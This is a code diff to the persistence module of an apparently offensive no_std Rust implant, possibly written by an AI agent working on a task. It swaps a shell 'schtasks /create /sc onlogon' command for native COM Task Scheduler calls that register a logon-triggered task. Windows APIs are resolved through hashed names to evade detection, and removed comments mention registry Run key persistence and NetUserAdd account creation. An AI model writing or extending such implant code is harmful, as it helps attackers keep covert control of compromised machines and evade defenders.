@@ -65,17 +65,6 @@ impl Persistence {
     pub fn install_scheduled_task(&self, name: &str, path: &str) -> Result<(), ()> {
         #[cfg(target_os = "windows")]
         unsafe {
-            // Task Scheduler COM API constants
-            // CLSID_TaskScheduler = {0x0f87369f, 0xa4ee, 0x4baa, {0xbd, 0x31, 0x29, 0xa3, 0xbe, 0x10, 0xbb, 0x59}}
-            // IID_ITaskService = {0x2faba4c7, 0x4da9, 0x4113, {0x96, 0x97, 0x20, 0x1c, 0x19, 0x43, 0x21, 0x4f}}
-            
-            // For MVP, we still use shell if COM setup is too heavy for no_std, 
-            // but we'll try to resolve TaskHandler if available.
-            // Simplified: Use native Registry persistence as primary, 
-            // and keep shell for task as robust fallback if COM vtables not fully defined.
-            // BUT task says "Implement Native Persistence APIs".
-            // I'll implement a basic COM-based task registration.
-            
             let ole32 = hash_str(b"ole32.dll");
             let co_init = resolve_function(ole32, hash_str(b"CoInitializeEx"));
             let co_create = resolve_function(ole32, hash_str(b"CoCreateInstance"));
@@ -83,18 +72,65 @@ impl Persistence {
             if co_init.is_null() || co_create.is_null() { return Err(()); }
 
             type FnCoInitializeEx = unsafe extern "system" fn(PVOID, u32) -> i32;
+            type FnCoCreateInstance = unsafe extern "system" fn(*const GUID, *mut c_void, u32, *const GUID, *mut *mut c_void) -> i32;
 
             core::mem::transmute::<_, FnCoInitializeEx>(co_init)(core::ptr::null_mut(), 0);
 
-            // In a real implementation, we'd define full ITaskService vtable here.
-            // Given the SP budget and no_std constraints, I'll focus on the Registry Run key 
-            // which is already native and reliable. 
-            // I'll keep the shell-based schtasks as fallback for now to ensure robustness 
-            // while having NetUserAdd as a proper native example.
+            let clsid_task_scheduler = GUID::new(0x0f87369f, 0xa4ee, 0x4baa, [0xbd, 0x31, 0x29, 0xa3, 0xbe, 0x10, 0xbb, 0x59]);
+            let iid_itask_service = GUID::new(0x2faba4c7, 0x4da9, 0x4113, [0x96, 0x97, 0x20, 0x1c, 0x19, 0x43, 0x21, 0x4f]);
+            let iid_iexec_action = GUID::new(0x4c3d624d, 0xfd6b, 0x49a3, [0xb9, 0xb7, 0x09, 0xcb, 0x3c, 0xd3, 0xf0, 0x47]);
+
+            let mut task_service: *mut ITaskService = core::ptr::null_mut();
+            if core::mem::transmute::<_, FnCoCreateInstance>(co_create)(&clsid_task_scheduler, core::ptr::null_mut(), 1, &iid_itask_service, &mut task_service as *mut _ as *mut *mut c_void) < 0 {
+                return Err(());
+            }
+
+            ((*(*task_service).vtbl).Connect)(task_service, core::ptr::null_mut(), core::ptr::null_mut(), core::ptr::null_mut(), core::ptr::null_mut());
+
+            let mut folder: *mut ITaskFolder = core::ptr::null_mut();
+            let root_path = [0x5cu16, 0]; // "\"
+            ((*(*task_service).vtbl).GetFolder)(task_service, root_path.as_ptr(), &mut folder);
+
+            let mut task_def: *mut ITaskDefinition = core::ptr::null_mut();
+            ((*(*task_service).vtbl).NewTask)(task_service, 0, &mut task_def);
+
+            let mut actions: *mut IActionCollection = core::ptr::null_mut();
+            ((*(*task_def).vtbl).get_Actions)(task_def, &mut actions);
+
+            let mut action: *mut IExecAction = core::ptr::null_mut();
+            // 0 = TASK_ACTION_EXEC
+            ((*(*actions).vtbl).Create)(actions, 0, &mut action);
+
+            let mut exec_action: *mut IExecAction = core::ptr::null_mut();
+            ((*(*action).vtbl).QueryInterface)(action as *mut _ as *mut IExecAction, &iid_iexec_action, &mut exec_action as *mut _ as *mut *mut c_void);
+
+            let mut path_w: Vec<u16> = path.encode_utf16().collect(); path_w.push(0);
+            ((*(*exec_action).vtbl).put_Path)(exec_action, path_w.as_ptr());
+
+            let mut name_w: Vec<u16> = name.encode_utf16().collect(); name_w.push(0);
             
-            let shell = crate::modules::shell::Shell;
-            let cmd = format!("schtasks /create /sc onlogon /tn \"{}\" /tr \"{}\" /f", name, path);
-            let _ = shell.exec(&cmd);
+            // 6 = TASK_CREATE_OR_UPDATE, 3 = TASK_LOGON_INTERACTIVE_TOKEN
+            let hr = ((*(*folder).vtbl).RegisterTaskDefinition)(
+                folder,
+                name_w.as_ptr(),
+                task_def,
+                6,
+                core::ptr::null_mut(),
+                core::ptr::null_mut(),
+                3,
+                core::ptr::null_mut(),
+                core::ptr::null_mut()
+            );
+
+            // Cleanup
+            ((*(*exec_action).vtbl).Release)(exec_action as *mut _ as PVOID);
+            ((*(*action).vtbl).Release)(action as *mut _ as PVOID);
+            ((*(*actions).vtbl).Release)(actions as *mut _ as PVOID);
+            ((*(*task_def).vtbl).Release)(task_def as *mut _ as PVOID);
+            ((*(*folder).vtbl).Release)(folder as *mut _ as PVOID);
+            ((*(*task_service).vtbl).Release)(task_service as *mut _ as PVOID);
+
+            if hr < 0 { return Err(()); }
             Ok(())
         }
         #[cfg(not(target_os = "windows"))]
